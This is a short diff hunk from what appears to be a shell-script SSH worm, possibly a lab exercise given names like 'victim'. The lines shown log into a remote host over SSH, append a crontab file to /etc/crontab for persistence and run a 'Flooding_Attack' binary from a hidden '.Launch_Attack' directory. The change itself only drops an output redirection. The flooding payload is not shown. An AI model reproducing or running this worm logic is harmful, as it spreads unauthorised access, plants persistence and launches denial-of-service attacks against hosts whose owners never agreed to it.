@@ -44,7 +44,7 @@ echo "qq2"
 ssh victim@"$IP_Address" 'Hidden2="/home/victim/.Launch_Attack";
 			echo "$(sudo cat /home/victim/Desktop/ssh_worm/crontab.txt)" >> /etc/crontab;
 			cd "$Hidden2" && ./Flooding_Attack;
-			cd /home/victim/Desktop/ssh_worm > /dev/null 2>&1'
+			cd /home/victim/Desktop/ssh_worm'
 
 echo "qq3"
 
